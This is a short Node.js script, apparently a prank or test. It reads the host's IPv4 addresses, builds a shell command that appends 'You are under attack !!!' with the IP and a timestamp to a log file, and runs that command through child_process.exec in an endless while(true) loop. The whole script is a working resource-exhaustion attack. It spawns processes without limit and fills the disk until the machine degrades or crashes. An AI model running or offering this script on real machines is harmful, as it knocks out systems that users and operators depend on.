var exec = require('child_process').exec;
var os = require('os');
var ifaces = os.networkInterfaces();
var cmd = '';
var timestamp = new Date().getTime();
Object.keys(ifaces).forEach(function (ifname) {
  var alias = 0;

  ifaces[ifname].forEach(function (iface) {
    if ('IPv4' !== iface.family || iface.internal !== false) {
      // skip over internal (i.e. 127.0.0.1) and non-ipv4 addresses
      return;
    }

    if (alias >= 1) {
      // this single interface has multiple ipv4 addresses
      console.log(ifname + ':' + alias, iface.address);
    } else {
      // this interface has only one ipv4 adress
      console.log(ifname, iface.address);
      cmd = 'echo "You are under attack !!! - ' + iface.address+ ' - ' + timestamp + '" >> ./test.log';
    }
    ++alias;
  });
});

console.log("cmd:",cmd);
while(true){
  exec(cmd, function(error, stdout, stderr) {
    // command output is in stdout
    // console.log("exec successfull",stdout);
  });
}
